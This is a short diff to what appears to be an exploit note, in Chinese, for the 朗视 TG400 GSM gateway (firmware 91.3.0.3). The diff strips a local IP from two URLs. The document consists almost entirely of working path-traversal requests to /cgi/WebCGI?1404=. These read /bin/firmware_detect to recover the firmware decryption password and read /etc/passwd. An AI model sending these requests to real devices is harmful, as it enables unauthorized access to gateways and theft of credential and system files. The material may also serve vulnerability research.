@@ -10,7 +10,7 @@
 朗视 TG400 GSM 网关91.3.0.3
 
 获取固件解密密码
-http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../bin/firmware_detect
+/cgi/WebCGI?1404=../../../../../../../../../../bin/firmware_detect
 
 /etc/passwd：
-http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../etc/passwd
+/cgi/WebCGI?1404=../../../../../../../../../../etc/passwd
